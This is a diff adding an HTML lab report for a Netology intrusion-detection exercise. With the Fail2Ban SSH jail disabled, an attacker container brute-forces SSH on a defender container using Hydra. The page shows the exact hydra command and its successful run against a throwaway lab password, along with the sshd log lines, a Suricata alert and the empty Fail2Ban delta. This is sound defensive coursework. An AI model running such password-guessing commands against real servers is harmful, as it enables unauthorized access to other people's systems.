@@ -1,0 +1,20 @@
+<!doctype html><meta charset="utf-8"><title>Task 2 | SSH jail disabled</title><style>html{background:#101923;color:#e9f0f7}body{margin:28px;font:16px/1.4 Consolas,monospace}h1{font:600 24px Segoe UI,sans-serif;color:#8ed7f7;margin:0 0 8px}p{color:#b2c6d7;margin:8px 0 18px}section{background:#182634;border:1px solid #31485b;padding:10px 14px;margin:10px 0;border-radius:6px}h2{font:600 16px Segoe UI,sans-serif;color:#9fe2c1;margin:0 0 5px}pre{margin:0;white-space:pre-wrap;overflow-wrap:anywhere;font:14px/1.35 Consolas,monospace}.cols{display:grid;grid-template-columns:1fr 1fr;gap:18px}</style><h1>Task 2 | SSH jail disabled</h1><p>Netology 13-03 | real Docker output | UTC 2026-11-07 | defender 172.30.133.10, attacker 172.30.133.20<br>LAB LOCAL signatures are lab instrumentation, not ET Open. Excerpts retain raw text; full logs are adjacent.</p><section><h2>disable-before-hydra.txt (selected raw lines)</h2><pre>OK
+|- Number of jail:	0
+`- Jail list:	</pre></section><section><h2>hydra-disabled.txt (selected raw lines)</h2><pre>docker exec -w /lab nt1303-attacker timeout 120 hydra -I -L users.txt -P pass.txt -t 1 -W 1 -f -V 172.30.133.10 ssh
+[DATA] max 1 task per 1 server, overall 1 task, 12 login tries (l:2/p:6), ~12 tries per task
+[DATA] attacking ssh://172.30.133.10:22/
+[ATTEMPT] target 172.30.133.10 - login "labuser" - pass "wrong-one" - 1 of 12 [child 0] (0/0)
+[ATTEMPT] target 172.30.133.10 - login "labuser" - pass "wrong-two" - 2 of 12 [child 0] (0/0)
+[ATTEMPT] target 172.30.133.10 - login "labuser" - pass "wrong-three" - 3 of 12 [child 0] (0/0)
+[ATTEMPT] target 172.30.133.10 - login "labuser" - pass "wrong-four" - 4 of 12 [child 0] (0/0)
+[ATTEMPT] target 172.30.133.10 - login "labuser" - pass "wrong-five" - 5 of 12 [child 0] (0/0)
+[ATTEMPT] target 172.30.133.10 - login "labuser" - pass "LabOnly-1303-Throwaway!" - 6 of 12 [child 0] (0/0)
+[22][ssh] host: 172.30.133.10   login: labuser   password: LabOnly-1303-Throwaway!
+[STATUS] attack finished for 172.30.133.10 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+[exit code: 0]</pre></section><section><h2>hydra-disabled-auth.log (selected raw lines)</h2><pre>2026-11-07T09:31:51.193434+00:00 9125a23ba101 sshd[363]: Failed password for labuser from 172.30.133.20 port 44252 ssh2
+2026-11-07T09:31:53.700849+00:00 9125a23ba101 sshd[363]: Failed password for labuser from 172.30.133.20 port 44252 ssh2
+2026-11-07T09:31:57.681937+00:00 9125a23ba101 sshd[363]: Failed password for labuser from 172.30.133.20 port 44252 ssh2
+2026-11-07T09:32:00.856883+00:00 9125a23ba101 sshd[363]: Failed password for labuser from 172.30.133.20 port 44252 ssh2
+2026-11-07T09:32:03.835717+00:00 9125a23ba101 sshd[363]: Failed password for labuser from 172.30.133.20 port 44252 ssh2
+2026-11-07T09:32:04.012951+00:00 9125a23ba101 sshd[363]: Accepted password for labuser from 172.30.133.20 port 44252 ssh2</pre></section><section><h2>hydra-disabled-suricata-fast.log (ET alert)</h2><pre>11/07/2026-09:31:48.501287  [**] [1:2001219:20] ET SCAN Potential SSH Scan [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 172.30.133.20:44252 -&gt; 172.30.133.10:22</pre></section><section><h2>hydra-disabled-checkpoint.txt (Fail2Ban delta)</h2><pre>hydra-disabled fail2ban.log: start=2091 end=2091 bytes=0 lines=0</pre></section>
